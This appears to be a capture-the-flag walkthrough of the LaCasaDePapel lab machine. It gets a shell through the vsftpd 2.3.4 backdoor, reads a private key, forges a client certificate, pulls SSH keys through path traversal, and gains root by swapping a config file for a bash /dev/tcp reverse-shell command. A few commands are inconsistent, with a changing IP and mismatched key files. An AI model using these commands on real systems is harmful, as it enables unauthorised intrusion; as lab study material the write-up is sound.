1,Recon
port scan
```
PORT     STATE    SERVICE  VERSION
21/tcp   open     ftp      vsftpd 2.3.4
22/tcp   open     ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp   open     http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp  open     ssl/http Node.js Express framework
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
6200/tcp filtered lm-x
Service Info: OS: Unix

```

When I see the version of service, I can remember `vsftpd 2.3.4 - Backdoor Command Execution`

Running `Metasploit’s` exploit against this box won’t work.Connect to FTP with any username that contains `:)`, and any password. Then connect to port 6200 to get a shell.
POC:
```
I can make this FTP connection with nc:
nc 10.10.10.131 21
220 (vsFTPd 2.3.4)
USER backdoored:)
331 Please specify the password.
PASS invalid

Now connect to the backdoor, and get a shell:
rlwrap nc 10.10.10.131 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman

This strange shell is psy, a “A runtime developer console, interactive debugger and REPL for PHP.” It takes php commands:

Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
getcwd()
=> "/"
get_current_user()
=> "root"

Unfortunately, system and other commands that run code on the OS seem to be blocked:

system('echo test');
PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1

For some reason, system is undefined. If I run phpinfo(), I can see why:
phpinfo()
PHP Version => 7.2.10                                        

System => Linux lacasadepapel 4.14.78-0-virt #1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018 x86_64 
Build Date => Sep 17 2018 09:23:43
...[snip]...
disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
...[snip]...
```

I can enumerate the box using `scandir` to list files, and file_get_contents to read files.
```
scandir("/home")
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
file_get_contents("/etc/os-release")
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.8.1
PRETTY_NAME="Alpine Linux v3.8"
HOME_URL="http://alpinelinux.org"
BUG_REPORT_URL="http://bugs.alpinelinux.org"
```

In looking around the box, I checked out the home directories and found something interesting in /home/nairobi:
```
scandir("/home/nairobi")
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
file_get_contents("/home/nairobi/ca.key")
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n
   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """
```

With access to the private key for the webserver, I can create a client certificate which will hopefully show me something new when I connect.

I can use openssl to look at the TLS configuration on this site. There’s a section on accepted certificates:
```
root@kali# openssl s_client -connect 10.10.10.131:443
CONNECTED(00000003)
depth=0 CN = lacasadepapel.htb, O = La Casa De Papel
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = lacasadepapel.htb, O = La Casa De Papel
verify return:1
---
Certificate chain
 0 s:CN = lacasadepapel.htb, O = La Casa De Papel
   i:CN = lacasadepapel.htb, O = La Casa De Papel
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs
YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x
OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl
cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG
9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV
QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8
/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B
4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV
ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR
PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG
SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C
hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6
vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx
BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI
EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli
MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4
-----END CERTIFICATE-----
subject=CN = lacasadepapel.htb, O = La Casa De Papel

issuer=CN = lacasadepapel.htb, O = La Casa De Papel

---
Acceptable client certificate CA names
CN = lacasadepapel.htb, O = La Casa De Papel
Client Certificate Types: RSA sign, DSA sign, ECDSA sign
Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1
Shared Requested Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224
Peer signing digest: SHA512
Peer signature type: RSA
Server Temp Key: ECDH, P-256, 256 bits
---
SSL handshake has read 1553 bytes and written 442 bytes
Verification error: self signed certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES128-GCM-SHA256
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES128-GCM-SHA256
    Session-ID: B1DBFEEEFA037FDC8BAE800DE2549CF10353955397452FA8A4765DEEBEA0E50F
    Session-ID-ctx:
    Master-Key: C1D1FA4F1BA4C2FABDE34E8D95424C5B57A023D4CC5888AAF0822B4FC8121D81D059D9F5DD4A5388237D277EC70779C6
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 4c 5a 06 97 cb 93 0b 9f-e7 5c 1c 9a 34 2f 89 59   LZ.......\..4/.Y
    0010 - 0a b9 46 16 b7 8c 1c de-2f 90 8d a0 7e 1b b4 ff   ..F...../...~...
    0020 - 6d 38 47 f2 76 99 df 08-bb 31 cd 63 ef 2d 6b a7   m8G.v....1.c.-k.
    0030 - 37 22 d5 12 a2 00 00 76-81 64 6e 4c 5c 78 5e 13   7".....v.dnL\x^.
    0040 - d2 09 c5 dc f1 51 60 54-18 4f ad 10 df 90 f6 f1   .....Q`T.O......
    0050 - 41 98 10 ba 41 cb c7 1e-f6 c7 39 33 af df 8b ff   A...A.....93....
    0060 - 03 03 63 ea a3 3d 50 57-9a ac fe d3 64 ed 6b cb   ..c..=PW....d.k.
    0070 - 7c e3 0e a5 b9 c3 e1 5f-69 69 48 00 1d 75 40 1d   |......_iiH..u@.
    0080 - 9d 46 4a f7 be 04 25 d8-9c ee fa d3 f7 d8 92 24   .FJ...%........$
    0090 - 63 2e 1c 6d 5a 3e 34 9a-9b be 4b e5 53 7f 52 7d   c..mZ>4...K.S.R}
    00a0 - cc b8 53 8e d8 8f ec ec-eb ae 56 bd 0c 13 49 89   ..S.......V...I.
    00b0 - 03 57 97 0f 89 32 f3 84-d6 e9 ab 36 c2 b0 fd 05   .W...2.....6....
    00c0 - 40 94 c9 c2 d4 59 20 4c-32 06 51 68 2e 51 55 35   @....Y L2.Qh.QU5

    Start Time: 1554214579
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
---
```

I’ll use the key and this information to make a certificate for myself:
```
root@kali# openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out wither.pem
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:La Casa De Papel
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:lacasadepapel.htb
Email Address []:

root@kali# openssl pkcs12 -export -in wither.pem -inkey ca.key -out wither.p12
Enter Export Password:
Verifying - Enter Export Password:
```

Now I’ll load it into firefox by going into preferences, searching for certificates, hitting “View Certificates”, and then hitting “Import…” and selecting my .p12. Now, with Burp off, I can reload the page, and it pops up asking me to confirm I want to send my certificate:
![](images/Pasted%20image%2020241216085857.png)

After I click ok, I see the site, now with a “Private Area”:
![](images/Pasted%20image%2020241216085913.png)

Once I click a season, I get sent to https://lacasadepapel.htb/?path=SEASON-2:
If I click on one of the avis, it takes me to https://lacasadepapel.htb/file/U0VBU09OLTIvMDEuYXZp. That base64 on the end of the path is just the file name:
```
root@kali# echo U0VBU09OLTIvMDEuYXZp | base64 -d
SEASON-2/01.avi
```

I can also browser around. Visit the parent directory shows what looks like a home dir https://lacasadepapel.htb/?path=..:
![](images/Pasted%20image%2020241216085959.png)

In the homedir for berlin, there’s a .ssh directory:
![](images/Pasted%20image%2020241216090031.png)
I’ll pull these files back. I’ll notice that the public key doesn’t match what’s in the authorized_keys file:
```
root@kali# curl -k https://10.10.10.131/file/$(echo -n "../.ssh/authorized_keys" | base64)
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsDHKXtzjeyuWjw42RbtoDy2c6lWdtfEzsmqmHrbJDY2hDcKWekWouWhe/NTCQFim6weKtsEdTzh0Qui+6jKc8/ZtpKzHrXiSXSe48JwpG7abmp5iCihzDozJqggBNoAQrvZqBhg6svcKh8F0kTnxUkBQgBm4kjOPteN+TfFoNIod7DQ72/N25D/lVThCLcStbPkR8fgBz7TGuTTAsNFXVwjlsgwi2qUF9UM6C1JkMBk5Y9ssDHiu4R35R5eCl4EEZLL946n/Gd5QB7pmIRHMkmt2ztOaKU4xZthurZpDXt+Et+Rm3dAlAZLO/5dwjqIfmEBS1eQ4sT8hlUkuLvjUDw== thek@ThekMac.local
root@kali# curl -k https://10.10.10.131/file/$(echo -n "../.ssh/id_rsa.pub" | base64)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCi0fpiC6mLsmGN1sNeGDZ/3GbPFoM13HESKgCAfYaNR5Rzhwl5N9T/JaDW/LHV1epqd/ADNg5AtSA73+sNsj3LnWtNCcuEeyn+IWIZ28M7mJnAs2vCbNUvGAZz6Y1pzerEdy4fHur7NAcHw19T+rPIAvb/GxGTME4NGDbW2xWqdNXzdPwIVIFQ7aPOK0cU2O9htpw/4mf1DljYdF0TTcNacAknvOThJZaJwzeuK65jJ6pXo5gpugfCL4UH3hjHXFo8UY/tPSOcFTeaiVRGEoqiU2pjvw8TmpimU7947kf/u8pusXsnlW2xWm8ZCyaOpSFAr8ahisy50iFx9BIxSemBZdi0KcikFrndpj9+XRdikv1rVlCHWIabiiV5Wdk2+oxriZv7yQLyTdYObD2mr9bd4ZVDpd7KP/iRQQ17VDzGP0EhctknBdge0AItLg9oplJFoVKORz/br9Pb3nx/agGokt/6jGLJ2BxMja8Lfg5jDBLtw5xKxLgeK9QLorugkkfDedQ2gDaB7dzCI7ps0esQowlY6symn1Qf0FtD+7uTkCntAXzIF+t0LrgQBTPJkldZ17U2FI2OIjSsGrMI9lAZI4sQgUDDNTRswi4m7gkhA4Af7e1+iHxxxR01yZ8fstpPukXdVjDKg8yjAukDx8bgVcbK+jKt95NcLoZjT7U1VQ== berlin@lacasadepapel.htb
```

I tried to access the authorized_keys files for all the other users, but wasn’t able to.

Still, I have this private key, so I’ll try to see if it logs in as any of the user I know of on the box. I’ll use a bash for loop to try each one, and when I get to professor, it works:

```
curl -k https://10.10.10.131/file/$(echo -n "../.ssh/authorized_keys" | base64) > id_rsa
chmod 400 id_rsa

for user in berlin dali nairobi oslo professor; do ssh -oBatchMode=yes -i ~/id_rsa_lacasadepapel_berlin $user@10.10.10.131; done

ssh -i id_rsa professor@10.10.10.131
```

In professor’s homedir, there are two files about memcache:
```
lacasadepapel [~]$ ls
memcached.ini  memcached.js   node_modules

lacasadepapel [~]$ cat memcached.ini 
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

by check process of background, sometimes I had success seeing this run every minute, but others I didn’t. 
```
ps auxww | grep memcached.js
 3756 nobody    0:17 /usr/bin/node /home/professor/memcached.js
```

If I could write to this file, I could change the command, and get a shell as the process that’s running the command in the ini file. But the file is owned by root and not writable by professor:
```
lacasadepapel [~]$ ls -l memcached.ini 
-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
```

However, it’s sitting in a directory that professor owns:
```
lacasadepapel [~]$ ls -ld .
drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 .
```

So I can’t edit it:
```
lacasadepapel [~]$ echo test >> memcached.ini 
-ash: can't create memcached.ini: Permission denied
```

But I can delete it and make a new one:
```
lacasadepapel [~]$ cp memcached.ini /dev/shm/
lacasadepapel [~]$ rm memcached.ini 
rm: remove 'memcached.ini'? y
lacasadepapel [~]$ echo -e "[program:memcached]\ncommand = bash -c 'bash -i  >& /dev/tcp/10.10.16.8/443 0>&1'" > memcached.ini
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = bash -c 'bash -i  >& /dev/tcp/10.10.14.10/443 0>&1'
lacasadepapel [~]$ ls -l memcached.ini 
-rw-r--r--    1 professo professo        71 Jul 19 08:48 memcached.ini
```

Then handle the nc and get the reverse shell of root.

